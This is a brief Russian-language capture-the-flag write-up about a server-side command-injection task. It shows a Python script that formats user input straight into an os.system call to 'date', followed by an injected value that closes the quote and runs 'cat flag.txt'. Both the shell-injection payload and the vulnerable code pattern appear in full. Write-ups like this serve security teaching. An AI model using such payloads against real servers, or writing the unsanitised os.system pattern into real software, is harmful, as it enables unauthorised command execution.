Задача на выполнение своей unix-команды на стороне сервера.

1. Смотрим на код файла, копия которого работает на стороне сервера:

```python
import os

date_format = input('What date do you want to get: ')
world_date = os.system('date +"{}"'.format(date_format))

print(world_date)
```

2. Замечаем возможность подставить свой параметр в текст команды. Закрываем кавычку, читаем флаг.

```bash
";cat flag.txt;"
```